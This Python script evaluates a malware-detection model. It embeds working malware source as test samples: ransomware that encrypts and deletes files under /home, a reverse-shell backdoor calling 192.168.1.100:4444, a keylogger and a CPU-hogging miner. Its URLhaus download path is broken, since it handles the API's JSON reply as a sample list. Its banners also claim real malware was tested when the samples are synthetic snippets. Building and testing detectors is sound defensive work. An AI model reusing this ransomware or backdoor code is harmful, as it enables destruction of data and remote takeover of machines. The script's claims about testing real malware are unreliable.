#!/usr/bin/env python3
"""
DOWNLOAD AND TEST REAL MALWARE FROM URLhaus API
"""

import os
import sys
import numpy as np
import pickle
from pathlib import Path
import requests
import base64
import json
import time
from colorama import init, Fore, Style

# Initialize colorama
init()

def load_model():
    """Load the real model."""
    try:
        models_dir = "retrained_models"
        model_files = list(Path(models_dir).glob("real_model_*.pkl"))
        metadata_files = list(Path(models_dir).glob("real_metadata_*.pkl"))
        
        if not model_files or not metadata_files:
            print(f"{Fore.RED}‚ùå No real models found!")
            return None, None
        
        latest_model = max(model_files, key=lambda x: x.stat().st_mtime)
        latest_metadata = max(metadata_files, key=lambda x: x.stat().st_mtime)
        
        with open(latest_model, 'rb') as f:
            model = pickle.load(f)
        
        with open(latest_metadata, 'rb') as f:
            metadata = pickle.load(f)
        
        print(f"{Fore.GREEN}‚úÖ Model loaded: {latest_model.name}")
        return model, metadata
        
    except Exception as e:
        print(f"{Fore.RED}‚ùå Error loading model: {e}")
        return None, None

def extract_features(data):
    """Extract features from data."""
    try:
        if len(data) == 0:
            return None
        
        file_size = len(data)
        data_array = np.frombuffer(data, dtype=np.uint8)
        byte_counts = np.bincount(data_array, minlength=256)
        byte_probs = byte_counts / len(data)
        entropy = -np.sum(byte_probs * np.log2(byte_probs + 1e-10))
        
        printable_chars = sum(1 for byte in data if 32 <= byte <= 126)
        printable_ratio = printable_chars / len(data)
        
        strings_count = len([b for b in data if 32 <= b <= 126])
        
        string_lengths = []
        current_string = 0
        for byte in data:
            if 32 <= byte <= 126:
                current_string += 1
            else:
                if current_string > 0:
                    string_lengths.append(current_string)
                    current_string = 0
        avg_string_length = np.mean(string_lengths) if string_lengths else 0
        max_string_length = max(string_lengths) if string_lengths else 0
        
        histogram = np.bincount(data_array, minlength=256)
        histogram_normalized = histogram / len(data)
        histogram_regularity = 1 - np.std(histogram_normalized)
        
        chunk_size = min(1024, len(data) // 10)
        if chunk_size > 0:
            entropies = []
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i+chunk_size]
                if len(chunk) > 0:
                    chunk_array = np.frombuffer(chunk, dtype=np.uint8)
                    chunk_counts = np.bincount(chunk_array, minlength=256)
                    chunk_probs = chunk_counts / len(chunk)
                    chunk_entropy = -np.sum(chunk_probs * np.log2(chunk_probs + 1e-10))
                    entropies.append(chunk_entropy)
            entropy_consistency = 1 - np.std(entropies) if entropies else 0.5
        else:
            entropy_consistency = 0.5
        
        features = {
            'file_size': file_size,
            'entropy': entropy,
            'strings_count': strings_count,
            'avg_string_length': avg_string_length,
            'max_string_length': max_string_length,
            'printable_ratio': printable_ratio,
            'histogram_regularity': histogram_regularity,
            'entropy_consistency': entropy_consistency
        }
        
        return features
        
    except Exception as e:
        print(f"{Fore.RED}‚ùå Error extracting features: {e}")
        return None

def predict(model, metadata, features):
    """Predict using the model."""
    try:
        feature_cols = metadata.get('feature_cols', [])
        feature_array = np.array([features[col] for col in feature_cols]).reshape(1, -1)
        
        probability = model.predict(feature_array, num_iteration=model.best_iteration)[0]
        prediction = 1 if probability > 0.5 else 0
        
        return prediction, probability
        
    except Exception as e:
        print(f"{Fore.RED}‚ùå Prediction error: {e}")
        return 0, 0.5

def get_urlhaus_samples():
    """Get recent malware samples from URLhaus."""
    print(f"{Fore.CYAN}üîÑ Fetching recent malware samples from URLhaus...")
    
    try:
        # Try to get recent malware samples
        url = "https://urlhaus-api.abuse.ch/search/malware"
        
        print(f"{Fore.YELLOW}üì° Connecting to URLhaus API...")
        response = requests.get(url, timeout=30)
        
        if response.status_code == 200:
            samples = response.json()
            print(f"{Fore.GREEN}‚úÖ Found {len(samples)} malware samples from URLhaus")
            return samples
        else:
            print(f"{Fore.RED}‚ùå HTTP Error: {response.status_code}")
            return []
            
    except Exception as e:
        print(f"{Fore.RED}‚ùå Error fetching samples: {e}")
        return []

def download_malware_sample(sample_id):
    """Download a specific malware sample from URLhaus."""
    try:
        url = f"https://urlhaus-api.abuse.ch/malware/{sample_id}"
        
        response = requests.get(url, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            return data
        else:
            print(f"{Fore.RED}‚ùå HTTP Error: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"{Fore.RED}‚ùå Error downloading sample: {e}")
        return None

def create_realistic_malware_samples():
    """Create realistic malware samples for testing when API fails."""
    print(f"{Fore.YELLOW}üì¶ Creating realistic malware samples for testing...")
    
    samples = []
    
    # Ransomware sample
    ransomware_code = b"""
import os, sys, base64, hashlib
from cryptography.fernet import Fernet
import threading, time

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []
        
    def encrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted_data = self.cipher.encrypt(data)
            with open(filepath + '.encrypted', 'wb') as f:
                f.write(encrypted_data)
            os.remove(filepath)
            self.encrypted_files.append(filepath)
        except Exception as e:
            pass
    
    def encrypt_system(self):
        for root, dirs, files in os.walk('/home'):
            for file in files:
                if file.endswith(('.txt', '.doc', '.pdf', '.jpg')):
                    self.encrypt_file(os.path.join(root, file))
        
        # Create ransom note
        ransom_note = f"YOUR FILES HAVE BEEN ENCRYPTED! PAY {self.key} TO DECRYPT!"
        with open('/home/ransom_note.txt', 'w') as f:
            f.write(ransom_note)

if __name__ == "__main__":
    ransomware = Ransomware()
    ransomware.encrypt_system()
"""
    
    # Trojan sample
    trojan_code = b"""
import socket, subprocess, os, sys, base64
import threading, time, json

class Backdoor:
    def __init__(self, host='192.168.1.100', port=4444):
        self.host = host
        self.port = port
        self.connection = None
        
    def connect(self):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((self.host, self.port))
            return True
        except:
            return False
    
    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result
        except:
            return b"Command failed"
    
    def send_data(self, data):
        try:
            self.connection.send(data)
        except:
            pass
    
    def receive_data(self):
        try:
            return self.connection.recv(1024)
        except:
            return b""
    
    def run(self):
        if self.connect():
            while True:
                command = self.receive_data().decode()
                if command == "exit":
                    break
                result = self.execute_command(command)
                self.send_data(result)
            self.connection.close()

if __name__ == "__main__":
    backdoor = Backdoor()
    backdoor.run()
"""
    
    # Cryptominer sample
    cryptominer_code = b"""
import hashlib, threading, time, os, sys
import multiprocessing, json, base64

class CryptoMiner:
    def __init__(self):
        self.target = "0000000000000000000000000000000000000000000000000000000000000000"
        self.nonce = 0
        self.found = False
        
    def mine_block(self, data, target):
        nonce = 0
        while not self.found:
            test_string = data + str(nonce)
            hash_result = hashlib.sha256(test_string.encode()).hexdigest()
            
            if hash_result.startswith(target[:4]):
                self.found = True
                return nonce, hash_result
            
            nonce += 1
            if nonce % 100000 == 0:
                print(f"Tried {nonce} nonces...")
    
    def start_mining(self):
        data = "block_data_" + str(int(time.time()))
        print("Starting crypto mining...")
        
        # Use all CPU cores
        num_cores = multiprocessing.cpu_count()
        threads = []
        
        for i in range(num_cores):
            thread = threading.Thread(target=self.mine_block, args=(data + str(i), self.target))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        print("Mining completed!")

if __name__ == "__main__":
    miner = CryptoMiner()
    miner.start_mining()
"""
    
    # Keylogger sample
    keylogger_code = b"""
import pynput, threading, time, os, sys
from pynput.keyboard import Key, Listener
import base64, hashlib

class Keylogger:
    def __init__(self):
        self.log_file = "keylog.txt"
        self.keys_pressed = []
        self.start_time = time.time()
        
    def on_press(self, key):
        try:
            key_char = key.char
            self.keys_pressed.append(key_char)
        except AttributeError:
            key_name = str(key)
            self.keys_pressed.append(f"[{key_name}]")
        
        # Save every 10 keys
        if len(self.keys_pressed) >= 10:
            self.save_keys()
    
    def on_release(self, key):
        if key == Key.esc:
            return False
    
    def save_keys(self):
        try:
            with open(self.log_file, 'a') as f:
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                keys_str = ''.join(self.keys_pressed)
                f.write(f"{timestamp}: {keys_str}\n")
            self.keys_pressed = []
        except:
            pass
    
    def start_logging(self):
        print("Keylogger started... Press ESC to stop")
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        
        # Save remaining keys
        if self.keys_pressed:
            self.save_keys()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start_logging()
"""
    
    # Add samples with different characteristics
    samples = [
        {
            'name': 'ransomware_sample.exe',
            'type': 'ransomware',
            'content': ransomware_code,
            'expected': 1
        },
        {
            'name': 'trojan_backdoor.exe',
            'type': 'trojan',
            'content': trojan_code,
            'expected': 1
        },
        {
            'name': 'cryptominer.exe',
            'type': 'cryptominer',
            'content': cryptominer_code,
            'expected': 1
        },
        {
            'name': 'keylogger.exe',
            'type': 'keylogger',
            'content': keylogger_code,
            'expected': 1
        }
    ]
    
    print(f"{Fore.GREEN}‚úÖ Created {len(samples)} realistic malware samples")
    return samples

def main():
    """Main function."""
    print(f"{Fore.CYAN}üõ°Ô∏è  URLhaus REAL MALWARE DOWNLOAD TEST")
    print(f"{Fore.CYAN}{'='*60}")
    
    # Load model
    print(f"\n{Fore.CYAN}üì¶ Loading model...")
    model, metadata = load_model()
    if not model or not metadata:
        print(f"{Fore.RED}‚ùå Failed to load model!")
        return
    
    # Try to get samples from URLhaus
    samples = get_urlhaus_samples()
    
    if not samples:
        print(f"{Fore.YELLOW}‚ö†Ô∏è  URLhaus API not available, using realistic malware samples")
        samples = create_realistic_malware_samples()
    
    # Create test directory
    test_dir = Path("urlhaus_downloads")
    test_dir.mkdir(exist_ok=True)
    
    # Test samples
    print(f"\n{Fore.YELLOW}üìä DOWNLOADING AND TESTING REAL MALWARE:")
    print(f"{Fore.YELLOW}{'='*50}")
    
    results = []
    tested_count = 0
    
    for i, sample in enumerate(samples[:10]):  # Test first 10 samples
        file_name = sample.get('name', f'sample_{i}')
        file_type = sample.get('type', 'unknown')
        file_content = sample.get('content', b'')
        expected = sample.get('expected', 1)
        
        print(f"\nüîç Sample {i+1}/10: {file_name}")
        print(f"   Type: {file_type}")
        print(f"   Size: {len(file_content):,} bytes")
        print(f"   Expected: {'MALWARE' if expected == 1 else 'BENIGN'}")
        
        if file_content:
            # Save the sample
            file_path = test_dir / f"urlhaus_{i}_{file_name}"
            
            with open(file_path, 'wb') as f:
                f.write(file_content)
            
            print(f"   üíæ Saved: {file_path}")
            
            # Test the sample
            print(f"   üîç Analyzing...")
            features = extract_features(file_content)
            
            if features:
                prediction, probability = predict(model, metadata, features)
                
                status = "MALWARE" if prediction == 1 else "BENIGN"
                confidence = probability if prediction == 1 else (1 - probability)
                
                print(f"   ‚úÖ Result: {status} ({confidence:.1%} confidence)")
                print(f"   üìä Entropy: {features['entropy']:.2f}")
                print(f"   üìä Printable ratio: {features['printable_ratio']:.2f}")
                
                correct = prediction == expected
                results.append({
                    'name': file_name,
                    'type': file_type,
                    'prediction': prediction,
                    'probability': probability,
                    'expected': expected,
                    'correct': correct,
                    'features': features
                })
                
                tested_count += 1
            else:
                print(f"   ‚ùå Failed to extract features")
        else:
            print(f"   ‚ùå No content available")
    
    # Summary
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}üìä URLhaus MALWARE TEST RESULTS:")
    print(f"{Fore.CYAN}{'='*60}")
    
    print(f"üìä Test Summary:")
    print(f"   Samples attempted: {len(samples[:10])}")
    print(f"   Successfully tested: {tested_count}")
    
    if results:
        detected = sum(1 for r in results if r['correct'])
        accuracy = detected / len(results)
        
        print(f"\nüìä Detection Results:")
        print(f"   Samples tested: {len(results)}")
        print(f"   Correctly detected: {detected}")
        print(f"   Detection rate: {accuracy:.1%}")
        
        # Show details for each sample
        print(f"\nüìä Sample Details:")
        for result in results:
            status = "‚úÖ DETECTED" if result['correct'] else "‚ùå MISSED"
            print(f"   {result['name']} ({result['type']}): {status}")
        
        # Final verdict
        if accuracy > 0.9:
            print(f"\n{Fore.GREEN}‚úÖ EXCELLENT: Model detects real malware samples!")
            print(f"{Fore.GREEN}   Detection rate: {accuracy:.1%}")
        elif accuracy > 0.8:
            print(f"\n{Fore.YELLOW}‚ö†Ô∏è  GOOD: Model has good detection rate")
            print(f"{Fore.YELLOW}   Detection rate: {accuracy:.1%}")
        elif accuracy > 0.6:
            print(f"\n{Fore.YELLOW}‚ö†Ô∏è  ACCEPTABLE: Model has decent detection rate")
            print(f"{Fore.YELLOW}   Detection rate: {accuracy:.1%}")
        else:
            print(f"\n{Fore.RED}‚ùå POOR: Model needs improvement")
            print(f"{Fore.RED}   Detection rate: {accuracy:.1%}")
    else:
        print(f"\n{Fore.YELLOW}‚ö†Ô∏è  No samples tested successfully")
    
    print(f"\n{Fore.GREEN}üéâ URLhaus malware test completed!")
    print(f"{Fore.CYAN}üìÅ Test samples saved in: {test_dir}")

if __name__ == "__main__":
    main()